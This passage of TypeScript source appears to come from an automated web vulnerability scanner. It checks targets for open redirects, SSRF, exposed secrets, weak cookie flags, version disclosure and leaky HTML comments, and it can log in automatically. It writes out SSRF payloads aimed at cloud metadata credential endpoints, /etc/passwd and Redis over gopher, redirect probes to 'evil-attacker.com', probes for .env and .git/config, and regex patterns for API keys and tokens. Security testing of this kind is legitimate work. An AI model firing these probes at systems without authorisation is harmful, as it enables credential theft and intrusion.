            endpoint: `GET ${probeUrl}`,
            param: probe.description,
            payload: probe.path,
            evidence: `${label} detected in response body. Excerpt: "${excerpt}". Reveals internal paths, framework, and code structure to attackers.`,
          });
          break; // One finding per probe URL
        }
      }
    } catch {
      // Probe failed — expected for some paths
    }
  }

  return findings;
}

// ── A10: Open redirect check on URL parameters ────────────────────────────────
async function checkOpenRedirectParams(url: string): Promise<PassiveFinding[]> {
  const findings: PassiveFinding[] = [];
  const parsedUrl = new URL(url);

  // Check existing query params for redirect-style names
  const redirectParams: string[] = [];
  parsedUrl.searchParams.forEach((_, key) => {
    if (/redirect|url|next|return|goto|dest|target|continue|redir|back|link/.test(key.toLowerCase())) {
      redirectParams.push(key);
    }
  });

  // Also test common redirect params even if not present
  const commonRedirectParams = ["redirect", "url", "next", "return_to", "continue", "goto"];
  for (const param of commonRedirectParams) {
    if (!redirectParams.includes(param)) redirectParams.push(param);
  }

  const redirectPayload = "https://evil-attacker.com";

  for (const param of redirectParams.slice(0, 5)) {
    try {
      const testUrl = new URL(url);
      testUrl.searchParams.set(param, redirectPayload);
      liveShow(testUrl.toString());
      const r = await sendRequestFallback("GET", testUrl.toString());
      const location = r.headers["location"] || "";
      if (r.status >= 300 && r.status < 400 && location.includes("evil-attacker.com")) {
        findings.push({
          type: "Open Redirect",
          severity: "Medium",
          endpoint: `GET ${testUrl.toString()}`,
          param,
          payload: redirectPayload,
          evidence: `Parameter '${param}' caused redirect to attacker-controlled URL. Location: ${location}. Can be used for phishing attacks.`,
        });
      }
    } catch {
      // ignore
    }
  }

  return findings;
}

// ── A10: SSRF ─────────────────────────────────────────────────────────────────
async function checkSSRF(url: string, extraUrls: string[] = []): Promise<PassiveFinding[]> {
  const findings: PassiveFinding[] = [];
  const parsedBase = new URL(url);

  // SSRF payloads — test internal/metadata endpoints
  const ssrfPayloads: Array<{ value: string; label: string }> = [
    { value: "http://127.0.0.1/", label: "localhost loopback" },
    { value: "http://localhost/", label: "localhost hostname" },
    { value: "http://0.0.0.0/", label: "0.0.0.0 loopback" },
    { value: "http://169.254.169.254/latest/meta-data/", label: "AWS IMDSv1 metadata" },
    { value: "http://169.254.169.254/latest/meta-data/iam/security-credentials/", label: "AWS IAM credentials" },
    { value: "http://metadata.google.internal/computeMetadata/v1/", label: "GCP metadata" },
    { value: "http://169.254.169.254/metadata/instance?api-version=2021-02-01", label: "Azure IMDS" },
    { value: "http://192.168.1.1/", label: "internal gateway" },
    { value: "file:///etc/passwd", label: "local file read (/etc/passwd)" },
    { value: "file:///etc/hosts", label: "local file read (/etc/hosts)" },
    { value: "dict://127.0.0.1:6379/info", label: "Redis via dict://" },
    { value: "gopher://127.0.0.1:6379/_INFO%0d%0a", label: "Redis via gopher://" },
  ];

  // Find URL-accepting parameters on the target and any discovered API endpoints
  const urlsToTest = [url, ...extraUrls];

  for (const testUrl of urlsToTest) {
    const parsed = new URL(testUrl);

    // Collect URL-accepting params from query string
    const urlParams: string[] = [];
    parsed.searchParams.forEach((val, key) => {
      if (/url|uri|src|source|href|link|host|endpoint|proxy|fetch|load|open|resource|feed|redirect|target|dest|path|img|image|callback|webhook|next|continue|goto|return/i.test(key)) {
        urlParams.push(key);
      }
    });

    // Also try common SSRF-prone param names even if not in current URL
    const commonSSRFParams = ["url", "uri", "src", "href", "proxy", "fetch", "endpoint", "target", "resource", "img", "image", "link", "callback", "webhook"];
    for (const p of commonSSRFParams) {
      if (!urlParams.includes(p)) urlParams.push(p);
    }

    for (const param of urlParams.slice(0, 6)) {
      for (const ssrfPayload of ssrfPayloads.slice(0, 6)) {
        try {
          const probeUrl = new URL(testUrl);
          probeUrl.searchParams.set(param, ssrfPayload.value);
          liveShow(probeUrl.toString());
          const r = await sendRequestFallback("GET", probeUrl.toString());

          // Indicators of SSRF success
          const body = r.body || "";
          const isSSRF =
            // AWS metadata fields
            /ami-id|instance-id|instance-type|local-ipv4|public-ipv4|security-credentials/i.test(body) ||
            // GCP metadata
            /computeMetadata|serviceAccounts|access_token/i.test(body) ||
            // /etc/passwd
            /root:.*:0:0:|\/bin\/bash|\/bin\/sh/.test(body) ||
            // /etc/hosts
            /127\.0\.0\.1\s+localhost/.test(body) ||
            // Redis
            /\+OK|redis_version|connected_clients/i.test(body) ||
            // Connection refused to internal port means server is making the request
            (r.status === 500 && /connection refused|ECONNREFUSED|connect timeout/i.test(body));

          if (isSSRF) {
            const excerpt = body.slice(0, 300).replace(/\s+/g, " ");
            findings.push({
              type: "SSRF (Server-Side Request Forgery)",
              severity: /passwd|credentials|access_token|serviceAccount/i.test(body) ? "Critical" : "High",
              endpoint: `GET ${probeUrl.toString()}`,
              param,
              payload: ssrfPayload.value,
              evidence: `Parameter '${param}' caused the server to fetch '${ssrfPayload.label}'. Response excerpt: "${excerpt}"`,
            });
            break; // One confirmed SSRF per param is enough
          }
        } catch {
          // ignore — connection failures are expected for most probes
        }
      }
    }
  }

  // Also test POST body of discovered forms — common SSRF vector
  // Inject SSRF payload into any form field that looks URL-accepting
  // (handled by classifyField in form attack phase — 'pathtraversal'/'openredirect' types)

  return findings;
}

// ── Sensitive information disclosure — response body scanner ─────────────────
// Scans page HTML, JS files, API responses, and common exposed files for
// secrets that are present in HTTP responses but NOT visible in the browser UI.
interface SecretFinding {
  type: string;
  severity: PassiveFinding["severity"];
  endpoint: string;
  param: string;
  payload: string;
  evidence: string;
}

const SECRET_PATTERNS: Array<{ label: string; severity: SecretFinding["severity"]; pattern: RegExp }> = [
  // Cloud provider keys
  { label: "AWS Access Key ID", severity: "Critical", pattern: /\bAKIA[0-9A-Z]{16}\b/ },
  { label: "AWS Secret Access Key", severity: "Critical", pattern: /\b[A-Za-z0-9+/]{40}\b(?=.*aws|.*AWS)/ },
  { label: "Google API Key", severity: "High", pattern: /\bAIza[0-9A-Za-z\-_]{35}\b/ },
  { label: "Google OAuth Client Secret", severity: "High", pattern: /GOCSPX-[0-9A-Za-z\-_]{28}/ },
  { label: "Azure Storage Key", severity: "Critical", pattern: /DefaultEndpointsProtocol=https;AccountName=[^;]+;AccountKey=[A-Za-z0-9+/=]{88}/ },

  // Auth tokens
  { label: "JWT Token", severity: "High", pattern: /eyJ[A-Za-z0-9\-_]+\.eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+/ },
  { label: "Bearer Token in response", severity: "High", pattern: /["\s]bearer\s+[A-Za-z0-9\-_.~+/]+=*/i },
  { label: "OAuth Access Token", severity: "High", pattern: /["\s]access_token[":\s]+["']?[A-Za-z0-9\-_.]{20,}/ },
  { label: "OAuth Refresh Token", severity: "High", pattern: /["\s]refresh_token[":\s]+["']?[A-Za-z0-9\-_.]{20,}/ },
  { label: "Session token / cookie value in response", severity: "Medium", pattern: /["\s](?:session|sessionid|sess)["\s]*[:=]["\s]*[A-Za-z0-9\-_]{20,}/i },

  // API keys
  { label: "Generic API Key", severity: "High", pattern: /["\s]api[_\-]?key[":\s]+["']?[A-Za-z0-9\-_]{20,}/i },
  { label: "Generic Secret Key", severity: "High", pattern: /["\s](?:secret|secret_key|app_secret)[":\s]+["']?[A-Za-z0-9\-_]{16,}/i },
  { label: "Stripe Secret Key", severity: "Critical", pattern: /\bsk_live_[0-9a-zA-Z]{24,}\b/ },
  { label: "Stripe Publishable Key", severity: "Medium", pattern: /\bpk_live_[0-9a-zA-Z]{24,}\b/ },
  { label: "SendGrid API Key", severity: "High", pattern: /\bSG\.[A-Za-z0-9\-_]{22}\.[A-Za-z0-9\-_]{43}\b/ },
  { label: "Twilio Account SID", severity: "High", pattern: /\bAC[0-9a-f]{32}\b/ },
  { label: "GitHub Token", severity: "High", pattern: /\bgh[pousr]_[A-Za-z0-9]{36,}\b/ },
  { label: "Slack Bot Token", severity: "High", pattern: /\bxoxb-[0-9A-Za-z\-]{24,}\b/ },
  { label: "Slack Webhook URL", severity: "Medium", pattern: /https:\/\/hooks\.slack\.com\/services\/[A-Z0-9]+\/[A-Z0-9]+\/[A-Za-z0-9]+/ },
  { label: "Firebase / GCP Service Account", severity: "Critical", pattern: /"private_key"\s*:\s*"-----BEGIN (RSA )?PRIVATE KEY/ },

  // Private keys / certificates
  { label: "RSA Private Key", severity: "Critical", pattern: /-----BEGIN (RSA )?PRIVATE KEY-----/ },
  { label: "PEM Certificate", severity: "Medium", pattern: /-----BEGIN CERTIFICATE-----/ },
  { label: "SSH Private Key", severity: "Critical", pattern: /-----BEGIN OPENSSH PRIVATE KEY-----/ },

  // Passwords in response
  { label: "Password field in JSON response", severity: "High", pattern: /["\s](?:password|passwd|pwd)[":\s]+["'][^"']{4,}/i },
  { label: "Database password in response", severity: "High", pattern: /(?:db_pass|database_password|mysql_password|postgres_password)[=:\s]["']?[^\s"']{6,}/i },
  { label: "Connection string", severity: "Critical", pattern: /(?:mongodb|mysql|postgres|mssql|redis|amqp):\/\/[^:\s]+:[^@\s]+@/ },

  // Internal infrastructure
  { label: "Internal IP address", severity: "Low", pattern: /\b(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})\b/ },
  { label: "Internal hostname / service URL", severity: "Low", pattern: /https?:\/\/(?:internal|intranet|corp|dev|staging|localhost|127\.0\.0\.1|10\.\d|192\.168\.)[\w./\-:]+/ },

  // Email addresses that shouldn't be public
  { label: "Admin/root email address", severity: "Low", pattern: /\b(?:admin|root|noreply|no-reply|support|security)@[\w.\-]+\.[a-z]{2,}\b/i },
];

async function checkSensitiveInfoDisclosure(
  baseUrl: string,
  extraEndpoints: string[] = []
): Promise<SecretFinding[]> {
  const findings: SecretFinding[] = [];
  const parsedBase = new URL(baseUrl);
  const origin = parsedBase.origin;

  // URLs to scan for secrets
  const scanTargets: Array<{ url: string; description: string }> = [
    { url: baseUrl, description: "main page" },
    // Common exposed files
    { url: `${origin}/.env`, description: ".env file" },
    { url: `${origin}/.env.local`, description: ".env.local file" },
    { url: `${origin}/.env.production`, description: ".env.production file" },
    { url: `${origin}/.git/config`, description: ".git/config" },
    { url: `${origin}/robots.txt`, description: "robots.txt" },
    { url: `${origin}/sitemap.xml`, description: "sitemap.xml" },
    { url: `${origin}/config.json`, description: "config.json" },
    { url: `${origin}/appsettings.json`, description: "appsettings.json" },
    { url: `${origin}/web.config`, description: "web.config" },
    { url: `${origin}/api/config`, description: "/api/config" },
    { url: `${origin}/api/v1/config`, description: "/api/v1/config" },
    { url: `${origin}/debug`, description: "/debug endpoint" },
    { url: `${origin}/actuator/env`, description: "Spring Boot /actuator/env" },
    { url: `${origin}/actuator/configprops`, description: "Spring Boot /actuator/configprops" },
    { url: `${origin}/swagger.json`, description: "Swagger JSON" },
    { url: `${origin}/openapi.json`, description: "OpenAPI JSON" },
    { url: `${origin}/phpinfo.php`, description: "phpinfo.php" },
    { url: `${origin}/info.php`, description: "info.php" },
    ...extraEndpoints.slice(0, 10).map((ep) => ({ url: ep, description: `API endpoint: ${ep}` })),
  ];

  // Deduplicate
  const seen = new Set<string>();

  for (const target of scanTargets) {
    if (seen.has(target.url)) continue;
    seen.add(target.url);

    try {
      // Navigate browser so user sees each file being probed
      liveShow(target.url);
      const r = await sendRequestFallback("GET", target.url);
      // Only scan successful responses (and some 403/500 that may still have body)
      if (r.status === 404) continue;

      const body = r.body || "";

      for (const { label, severity, pattern } of SECRET_PATTERNS) {
        const match = body.match(pattern);
        if (match) {
          // Redact most of the secret value for safety in report
          const raw = match[0];
          const redacted = raw.length > 20
            ? raw.slice(0, 8) + "..." + raw.slice(-4)
            : raw.slice(0, 4) + "...";

          // Avoid duplicate findings for same type + endpoint
          const key = `${label}::${target.url}`;
          if (seen.has(key)) continue;
          seen.add(key);

          findings.push({
            type: "Sensitive Information Disclosure",
            severity,
            endpoint: `GET ${target.url}`,
            param: label,
            payload: "",
            evidence: `${label} found in ${target.description} response body. Value (redacted): "${redacted}". This data is NOT visible in the browser UI but is present in the HTTP response.`,
          });
        }
      }
    } catch {
      // Endpoint not reachable — expected for most common-file checks
    }
  }

  return findings;
}

/** Check cookie security flags: HttpOnly, Secure, SameSite */
async function checkCookieSecurity(url: string): Promise<PassiveFinding[]> {
  const findings: PassiveFinding[] = [];
  try {
    liveShow(url);
    const resp = await sendRequestFallbackCached("GET", url);
    const rawCookies = resp.headers["set-cookie"] || resp.headers["Set-Cookie"] || "";
    if (!rawCookies) return findings;

    // set-cookie may be a single string or multi-value (depends on http lib)
    const cookieList = Array.isArray(rawCookies) ? rawCookies : rawCookies.split(/,(?=[^ ])/);

    for (const cookie of cookieList) {
      const namePart = cookie.split(";")[0].trim();
      const cookieName = namePart.split("=")[0].trim() || "unknown";
      const lower = cookie.toLowerCase();

      if (!/\bhttponly\b/.test(lower)) {
        findings.push({
          type: "Cookie Missing HttpOnly Flag",
          severity: "Low",
          endpoint: url,
          param: `cookie:${cookieName}`,
          payload: "",
          evidence: `Cookie "${cookieName}" is missing the HttpOnly flag — JS can read it via document.cookie. Set-Cookie: ${cookie.substring(0, 120)}`,
        });
      }
      if (url.startsWith("https") && !/\bsecure\b/.test(lower)) {
        findings.push({
          type: "Cookie Missing Secure Flag",
          severity: "Low",
          endpoint: url,
          param: `cookie:${cookieName}`,
          payload: "",
          evidence: `Cookie "${cookieName}" is missing the Secure flag — can be sent over HTTP. Set-Cookie: ${cookie.substring(0, 120)}`,
        });
      }
      if (!/\bsamesite\b/.test(lower)) {
        findings.push({
          type: "Cookie Missing SameSite Attribute",
          severity: "Info",
          endpoint: url,
          param: `cookie:${cookieName}`,
          payload: "",
          evidence: `Cookie "${cookieName}" has no SameSite attribute — may be vulnerable to CSRF. Set-Cookie: ${cookie.substring(0, 120)}`,
        });
      }
    }
  } catch { /* ignore */ }
  return findings;
}

/** Detect server/framework version numbers disclosed in response headers */
async function checkVersionDisclosure(url: string): Promise<PassiveFinding[]> {
  const findings: PassiveFinding[] = [];
  try {
    liveShow(url);
    const resp = await sendRequestFallbackCached("GET", url);
    const headers = resp.headers;

    const versionHeaders: Array<[string, string]> = [
      ["server", "Server"],
      ["x-powered-by", "X-Powered-By"],
      ["x-aspnet-version", "X-AspNet-Version"],
      ["x-aspnetmvc-version", "X-AspNetMvc-Version"],
      ["via", "Via"],
      ["x-generator", "X-Generator"],
      ["x-drupal-cache", "X-Drupal-Cache"],
      ["x-wp-nonce", "X-WP-Nonce"],
    ];

    for (const [key, label] of versionHeaders) {
      const val = headers[key] || headers[key.toLowerCase()];
      if (!val) continue;
      // Check if the header value contains a version number
      if (/\d+\.\d+/.test(val)) {
        findings.push({
          type: "Server Version Disclosure",
          severity: "Info",
          endpoint: url,
          param: label,
          payload: "",
          evidence: `${label}: ${val} — version number may help attackers identify known CVEs.`,
        });
      }
    }

    // Also check for PHP/Apache/nginx version in Server header without version-header check
    const serverVal = headers["server"] || "";
    if (/php\/\d/i.test(serverVal)) {
      findings.push({
        type: "PHP Version Disclosure",
        severity: "Low",
        endpoint: url,
        param: "Server",
        payload: "",
        evidence: `Server header discloses PHP version: "${serverVal}"`,
      });
    }
  } catch { /* ignore */ }
  return findings;
}

/** Scan HTML source for comments containing potentially sensitive information */
async function checkHTMLComments(url: string): Promise<PassiveFinding[]> {
  const findings: PassiveFinding[] = [];
  try {
    // Queue browser nav for visibility; use cached response as fallback for body
    liveShow(url);
    let body = "";
    try {
      const src = await sendExtensionCommand("browser_action", { action: "get_page_source" }, 8000);
      body = String(src?.source || src?.result?.source || src?.html || src?.result?.html || "");
    } catch { /* fall through */ }
    if (!body) {
      const resp = await sendRequestFallbackCached("GET", url);
      body = resp.body || "";
    }
    if (!body) return findings;

    // Extract all HTML comments
    const commentRegex = /<!--([\s\S]*?)-->/g;
    let match;
    const sensitivePatterns = [
      { re: /password|passwd|pwd/i, label: "password reference" },
      { re: /api[_\s-]?key|apikey/i, label: "API key reference" },
      { re: /token|secret|bearer/i, label: "token/secret reference" },
      { re: /todo|fixme|hack|bug|security|vuln/i, label: "developer note" },
      { re: /debug|test|staging|dev\s|development/i, label: "debug/test note" },
      { re: /user\s*=|admin\s*=|root\s*=/i, label: "credential pattern" },
      { re: /internal|intranet|localhost|127\.0\.0\.1/i, label: "internal infrastructure reference" },
      { re: /copyright\s+\d{4}|version\s+\d+\.\d+/i, label: "version/copyright info" },
    ];

    const reported = new Set<string>();
    while ((match = commentRegex.exec(body)) !== null) {
      const comment = match[1].trim();
      if (!comment || comment.length < 5) continue;
      for (const { re, label } of sensitivePatterns) {
        if (re.test(comment)) {
          const key = `${label}:${comment.substring(0, 50)}`;
          if (!reported.has(key)) {
            reported.add(key);
            findings.push({
              type: "Sensitive HTML Comment",
              severity: "Info",
              endpoint: url,
              param: "HTML source",
              payload: "",
              evidence: `HTML comment with ${label}: "<!-- ${comment.substring(0, 200).replace(/\n/g, " ")} -->"`,
            });
          }
          break;
        }
      }
    }
  } catch { /* ignore */ }
  return findings;
}

async function executeAutoCrawl(rawInput: AutoCrawlOptions = {}) {
  // If a scan is already running, abort it first and wait for it to wind down.
  if (_scanRunning) {
    console.error("[Scan] Another scan is already running — aborting it before starting a new one");
    scanAbortFlag = true;
    // Give the running scan up to 3s to notice the abort flag and exit
    const deadline = Date.now() + 3000;
    while (_scanRunning && Date.now() < deadline) {
      await new Promise(r => setTimeout(r, 100));
    }
    if (_scanRunning) {
      // Force-clear if it didn't stop cleanly
      _scanRunning = false;
    }
  }
  _scanRunning = true;
  scanStoppedByUser = false; // reset explicit-stop flag for this new scan run
  // If the scan hangs (e.g. page crash, extension unresponsive), return
  // whatever findings have been collected so far instead of running forever.
  const SCAN_TIMEOUT_MS = 10 * 60 * 1000; // 10 minutes
  let _scanTimeoutHandle: ReturnType<typeof setTimeout> | null = null;
  const _timeoutPromise = new Promise<void>((_, reject) => {
    _scanTimeoutHandle = setTimeout(() => {
      reject(new Error("SCAN_TIMEOUT"));
    }, SCAN_TIMEOUT_MS);
  });

  // Heartbeat watchdog: extension pings /ghostcrawler/heartbeat every 2s.
  // Fires only when heartbeat is stale AND no liveShow() navigation was queued
  // recently (nav queue drainer causes the content script to reload, dropping
  // heartbeats temporarily — that is expected and should not abort the scan).
  lastExtensionHeartbeat = Date.now();
  const HEARTBEAT_GRACE_MS = 6000;
  const HEARTBEAT_STALE_MS = 15000;    // stale threshold (content script alive check)
  const NAV_GRACE_MS = 12000;          // ignore stale heartbeat for 12s after any liveShow()
  const heartbeatStartedAt = Date.now();
  const heartbeatTimer = setInterval(() => {
    if (Date.now() - heartbeatStartedAt < HEARTBEAT_GRACE_MS) return;
    if (lastExtensionHeartbeat === 0) return;
    const stale = Date.now() - lastExtensionHeartbeat;
    // Skip watchdog trigger if a navigation was queued recently — heartbeat
    // drops during page load are expected and should not abort the scan.
    const navRecent = _lastLiveShowMs > 0 && (Date.now() - _lastLiveShowMs) < NAV_GRACE_MS;
    if (stale > HEARTBEAT_STALE_MS && !scanAbortFlag && !navRecent) {
      console.error(`[Scan] 💔 Extension heartbeat lost (${stale}ms, no recent nav) — aborting scan`);
      logActivity(`Extension heartbeat lost (${Math.round(stale / 1000)}s) — aborting`);
      scanAbortFlag = true;
      scanState.currentTest = "Aborted — extension disconnected";
    }
  }, 3000);

  return Promise.race([
    _executeAutoCrawlInner(rawInput).finally(() => {
      if (_scanTimeoutHandle) clearTimeout(_scanTimeoutHandle);
      clearInterval(heartbeatTimer);
    }),
    _timeoutPromise,
  ]).catch((err: Error) => {
    clearInterval(heartbeatTimer);
    if (err.message === "SCAN_TIMEOUT") {
      console.error("[Scan] ⏰ Global scan timeout reached (10 min) — returning findings collected so far");
      logActivity("Scan timed out after 10 minutes — partial results returned");
      scanState.status = "completed";
      scanState.currentTest = `Timed out — ${scanState.vulnerabilities.length} finding(s) collected`;
      scanState.phase = "complete";
      scanState.progress = 100;
    } else {
      throw err;
    }
  }).finally(() => {
    _scanRunning = false;
  });
}

async function _executeAutoCrawlInner(rawInput: AutoCrawlOptions = {}) {
  // Reset Burp circuit breaker so a fresh scan can re-establish Burp connection
  resetBurpCircuit();
  // Bridge already holds a live SSE connection to Burp — no reconnect needed at scan start.
  _burpToolsDiscovered = false;
  repeaterTabsSent.clear(); // clear dedup set so tabs are recreated for the new run
  _scanRespCache.clear();   // clear per-scan response cache
  _navQueue.length = 0;     // clear any stale browser nav queue from a prior run
  _lastLiveShowMs = 0;      // reset nav-grace window for the watchdog

  // Auto-detect target URL from the active browser tab ONLY when no URL was
  // explicitly provided. Never silently override a caller-supplied targetUrl —
  // that caused scans to drift to whatever page happened to be open.
  try {
    const tabInfo = await sendExtensionCommand("get_url", {}, 8000);
    if (tabInfo?.url && tabInfo.url.startsWith("http")) {
      if (!rawInput.targetUrl) {
        console.error(`[Scan] Auto-detected target URL: ${tabInfo.url}`);
        rawInput = { ...rawInput, targetUrl: tabInfo.url };
      } else {
        console.error(`[Scan] Using provided targetUrl: ${rawInput.targetUrl} (browser is at ${tabInfo.url})`);
      }
    }
  } catch (e) {
    console.error("[Scan] Could not detect active tab URL:", (e as any).message);
  }

  const maxDepth = Math.max(1, Number(rawInput.maxDepth ?? 1));
  const requestedAttacks: string[] = Array.isArray(rawInput.attacks) && rawInput.attacks.length
    ? rawInput.attacks
    : [];
  const observeMs = Math.max(0, Number(rawInput.observeMs ?? 1200));
  const timeoutMs = Math.max(6000, Number(rawInput.timeoutMs ?? 20000));
  const settleMs = Math.max(300, Number(rawInput.settleMs ?? 800));

  // Skills-guided OWASP baseline:
  // - UI flows: XSS + SQLi + default credentials where forms exist
  // - API flows: SQLi + XSS + IDOR + Command Injection via runLiveScan()
  const skillPlan = {
    guideline: "skills.md-owasp",
    ui: {
      xss: requestedAttacks.length ? requestedAttacks.includes("xss") : true,
      sqli: requestedAttacks.length ? requestedAttacks.includes("manual-sqli") : true,
      defaultCreds: requestedAttacks.length ? requestedAttacks.includes("default-creds") : true,
    },
    api: {
      sqli: true,
      xss: true,
      idor: true,
      commandInjection: true,
    },
  };

  const scanTargetUrl = String(rawInput.targetUrl || "");
  const discoveredSurfaces: any[] = [];
  const discoveredEndpoints = new Map<string, { method: string; url: string; params: any }>();
  const visitedUrls = new Set<string>();
  const formFindings: Array<{
    type: string;
    severity: string;
    endpoint: string;
    param: string;
    payload: string;
    evidence?: string;
  }> = [];

  // ── Scope guard ─────────────────────────────────────────────────────
  // Only test URLs on the same hostname as the seed target.
  // This prevents the scan from crawling into third-party OAuth pages,
  // external CDNs, or unrelated domains.
  const _seedHostname = (() => {
    try { return new URL(scanTargetUrl).hostname; } catch { return ""; }
  })();
  const inScope = (url: string): boolean => {
    if (!_seedHostname) return true; // no seed → allow all
    try { return new URL(url).hostname === _seedHostname; } catch { return false; }
  };

  // Burp MCP tool discovery is now lazy — happens on the first callBurpMCP() call
  // so we don't open a Burp SSE connection at scan startup while Burp may still
  // be cleaning up the previous session's connection.

  const normalizeScan = (scanResult: any) => {
    const maybe = scanResult?.result || scanResult;
    if (maybe?.scan?.page) return maybe.scan;
    return maybe;
  };

  const addEndpoints = (surface: any) => {
    const endpoints = surface?.endpoints || [];
    for (const endpoint of endpoints) {
      if (!endpoint?.url) continue;
      if (!inScope(endpoint.url)) continue; // skip out-of-scope endpoints
      const method = String(endpoint.method || "GET").toUpperCase();
      const key = `${method} ${endpoint.url}`;
      if (!discoveredEndpoints.has(key)) {
        discoveredEndpoints.set(key, {
          method,
          url: endpoint.url,
          params: endpoint.params || {},
        });
      }
    }
  };

  const findFieldSelectors = (surface: any) => {
    const fields = (surface?.forms || []).flatMap((form: any) => form.fields || []);
    const textFields = fields.filter((field: any) => {
      const type = String(field?.type || "text").toLowerCase();
      return !["password", "submit", "hidden", "checkbox", "radio", "button"].includes(type);
    });

    const toSelector = (field: any) => {
      if (field?.selector) return field.selector;
      if (field?.name) return `input[name=\"${field.name}\"]`;
      if (field?.id) return `#${field.id}`;
      return null;
    };

    const usernameField = fields.find((field: any) =>
      /user|email|phone|login|account|mobile/i.test(
        `${field?.name || ""} ${field?.id || ""} ${field?.label || ""} ${field?.placeholder || ""}`
      )
    );
    const passwordField = fields.find((field: any) =>
      String(field?.type || "").toLowerCase() === "password" ||
      /pass|pwd|secret/i.test(
        `${field?.name || ""} ${field?.id || ""} ${field?.label || ""} ${field?.placeholder || ""}`
      )
    );

    const submitSelector = (surface?.buttons || []).find((button: any) => {
      const text = `${button?.text || ""} ${button?.selector || ""}`.toLowerCase();
      return /submit|login|log in|sign in|continue/.test(text);
    })?.selector || "button[type='submit']";

    return {
      textSelectors: textFields.map(toSelector).filter(Boolean),
      textFieldContexts: textFields.map((f: any) => {
        const selector = toSelector(f);
        if (!selector) return null;
        const hint = [f?.label, f?.placeholder, f?.name, f?.id, f?.type].filter(Boolean).join(" ").toLowerCase();
        return { selector, hint };
      }).filter(Boolean) as Array<{selector: string; hint: string}>,
      usernameSelector: toSelector(usernameField),
      passwordSelector: toSelector(passwordField),
      submitSelector,
    };
  };

  // Phase 0: Authenticate if credentials provided
  scanAbortFlag = false;
  repeaterTabsSent.clear();
  resetVulnDedup();
  scanState = {
    status: "scanning",
    currentTest: "Phase 0/2: authentication",
    progress: 0,
    vulnerabilities: [],
    totalTests: 0,
    completedTests: 0,
    phase: "",
    reasoning: "",
    activityLog: [],
  };
  const captchaMode = rawInput.captchaMode ?? null;
  const authCredentials = Array.isArray(rawInput.credentials) && rawInput.credentials.length > 0
    ? rawInput.credentials[0]
    : null;

  if (captchaMode === "skip") {
    console.error("[Scan] captchaMode=skip — skipping authentication phase");
    scanState.currentTest = "Phase 0/2: authentication skipped";
  } else if (authCredentials) {
    try {
      scanState.currentTest = `Phase 0/2: logging in as ${authCredentials.username}`;
      console.error(`[Scan] Attempting authentication with ${authCredentials.username}`);

      const initialScan = normalizeScan(await sendExtensionCommand("scan", {}, 30000));
      const loginSelectors = findFieldSelectors(initialScan);

      if (loginSelectors.usernameSelector && loginSelectors.passwordSelector) {
        // Ask pentester if they want to proceed with authentication before filling credentials
        const proceedWithAuth = await waitForLoginFormDecision(scanTargetUrl);
        if (!proceedWithAuth) {
          console.error("[Scan] Pentester skipped authentication — continuing unauthenticated");
          scanState.currentTest = "Phase 0/2: authentication skipped by pentester";
        } else {
        // Fill credentials first (before any CAPTCHA pause)
        await sendExtensionCommand("browser_action", {
          action: "type",
          selector: loginSelectors.usernameSelector,
          text: authCredentials.username,
          clearFirst: true,
        }, timeoutMs);

        await sendExtensionCommand("browser_action", {
          action: "type",
          selector: loginSelectors.passwordSelector,
          text: authCredentials.password,
          clearFirst: true,
        }, timeoutMs);

        // Detect reCAPTCHA on the page
        let hasCaptcha = false;
        try {
          await sendExtensionCommand("browser_action", {
            action: "extract_text",
            selector: ".g-recaptcha, [data-sitekey], iframe[src*='recaptcha']",
          }, 5000);
          hasCaptcha = true;
        } catch {
          hasCaptcha = false;
        }

        if (hasCaptcha || captchaMode === "manual") {
          console.error("[Scan] CAPTCHA detected — pausing for manual solve");
          scanState.status = "captcha-waiting";
          scanState.currentTest =
            "⏸ CAPTCHA detected — solve it in the browser then click Continue in the popup, or click Skip Authentication";

          // Wait up to 5 minutes for the user to resolve via popup
          const skipped = await new Promise<boolean>((resolve) => {
            captchaResolve = resolve;
            setTimeout(() => {
              if (captchaResolve) {
                captchaResolve = null;
                resolve(true); // auto-skip on timeout
              }
            }, 5 * 60 * 1000);
          });

          scanState.status = "scanning";

          if (skipped) {
            console.error("[Scan] User skipped authentication — continuing unauthenticated");
            scanState.currentTest = "Phase 0/2: authentication skipped by user";
          } else {
            console.error("[Scan] User confirmed CAPTCHA solved — submitting login form");
            scanState.currentTest = "Phase 0/2: submitting login form";
            await sendExtensionCommand("browser_action", {
              action: "click",
              selector: loginSelectors.submitSelector,
            }, timeoutMs);
            await new Promise((resolve) => setTimeout(resolve, settleMs + 1000));
            scanState.currentTest = "Phase 0/2: authenticated successfully";
          }
        } else {
          // No CAPTCHA — submit directly
          await sendExtensionCommand("browser_action", {
            action: "click",
            selector: loginSelectors.submitSelector,
          }, timeoutMs);
          await new Promise((resolve) => setTimeout(resolve, settleMs + 1000));
          console.error("[Scan] Authentication completed");
          scanState.currentTest = "Phase 0/2: authenticated successfully";
        }
        } // end proceedWithAuth else
      } else {
        console.error("[Scan] No login form detected, proceeding without authentication");
        scanState.currentTest = "Phase 0/2: no login form found, skipping auth";
      }
    } catch (error) {
      console.error(`[Scan] Authentication failed: ${String(error)}, proceeding unauthenticated`);
      scanState.currentTest = "Phase 0/2: auth failed, proceeding unauthenticated";
    }
  } else {
    console.error("[Scan] No credentials provided, proceeding unauthenticated");
  }

  // ── Navigate browser to target BEFORE source review ──────────────────────
  // This ensures get_page_source in checkClientSideSource returns the correct page,
  // and the user sees the browser move at the very start of the scan.
  if (scanTargetUrl) {
    try {
      await sendExtensionCommand("browser_action", { action: "navigate", url: scanTargetUrl }, 12000).catch(() => {});
      await new Promise(r => setTimeout(r, 1500));
      console.error(`[Scan] Navigated browser to target: ${scanTargetUrl}`);
    } catch (e) {
      console.error("[Scan] Could not navigate to target before source review:", (e as any).message);
    }
  }

  // ── Source review (runs FIRST — before fingerprinting and crawl) ────
  // Discovers hidden fields and JS endpoints that will inform Phase 1 & 2.
  let earlySourceFindings: PassiveFinding[] = [];
  if (scanTargetUrl) {
    try {
      setPhase("source-review");
      logActivity("Analyzing client-side source code for hidden fields and JS endpoints");
      scanState.currentTest = "Phase 0/2: client-side source review";
      earlySourceFindings = await checkClientSideSource(scanTargetUrl);
      logActivity(`Source review complete — ${earlySourceFindings.length} finding(s)`);
      console.error(`[ClientSrc] Early source review: ${earlySourceFindings.length} finding(s)`);
      // Seed discoveredEndpoints with any JS-extracted API endpoints
